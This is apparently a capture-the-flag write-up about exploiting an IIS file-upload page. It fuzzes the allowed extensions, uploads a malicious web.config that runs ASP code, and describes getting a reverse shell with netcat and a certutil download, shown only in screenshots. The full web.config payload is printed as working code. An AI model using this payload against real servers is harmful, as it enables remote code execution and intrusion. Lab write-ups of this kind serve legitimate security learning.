## Vulnerabilities

### Transfer.aspx Directory

Asp through webconfig [https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/](https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## Exploitation

### Upload Extensions

Let's see what extensions we can upload to the server

First, let's send the upload action to a repeater

### Creating Payload

Now let's create our payload

![Image](/assets/img/bounty/Untitled_5.png)

Let this be our `extensions.txt` file

![Image](/assets/img/bounty/Untitled_6.png)

We send the request to the intruder and then add our payload

![Image](/assets/img/bounty/Untitled_7.png)

### Defining Payload

Here we define the payload

![Image](/assets/img/bounty/Untitled_8.png)

OK, so with this we can tell that the server accepts uploads with these extensions

### Using Config File

[https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/](https://soroush.me/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

This config file allows us to upload ASP files, which could give us a shell, so let's use this

```xml

`<?xml` `version="1.0"` `encoding="UTF-8"?>`

`<configuration>`

`<system.webServer>`

`<handlers` `accessPolicy="Read, Script, Write">`

`<add` `name="web_config"` `path="*.config"` `verb="*"` `modules="IsapiModule"` `scriptProcessor="%windir%\system32\inetsrv\asp.dll"` `resourceType="Unspecified"` `requireAccess="Write"` `preCondition="bitness64"` `/>`

`</handlers>`

`<security>`

`<requestFiltering>`

`<fileExtensions>`

`<remove` `fileExtension=".config"` `/>`

`</fileExtensions>`

`<hiddenSegments>`

`<remove` `segment="web.config"` `/>`

`</hiddenSegments>`

`</requestFiltering>`

`</security>`

`</system.webServer>`

`</configuration>`

`<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!`

`<%`

`Response.write("-"&"->")`

`' it is running the ASP code if you can see 3 by opening the web.config file!`

`Response.write(1+2)`

`Response.write("<!-"&"-")`

`%>`

- `->`

```

### Uploading Shell

Now let's upload this file on the server

![Image](/assets/img/bounty/Untitled_10.png)

![Image](/assets/img/bounty/Untitled_11.png)

It's displaying 3, which means our web.config file is working properly

### Getting a Shell

Now we can go ahead and try getting a shell

![Image](/assets/img/bounty/Untitled_12.png)

Alright, we have made our payload, now time to get it running on the victim's box

### Setting Up

Setting up our Python server and netcat

![Image](/assets/img/bounty/Untitled_13.png)

### Using Certutil

We will now use certutil to get the exe payload

![Image](/assets/img/bounty/Untitled_14.png)

### Uploading and Refreshing

And on uploading, then refreshing the uploadedfiles/webconfig dir

We have our shell

**Note: Shell kept bugging out, will update this in the future**
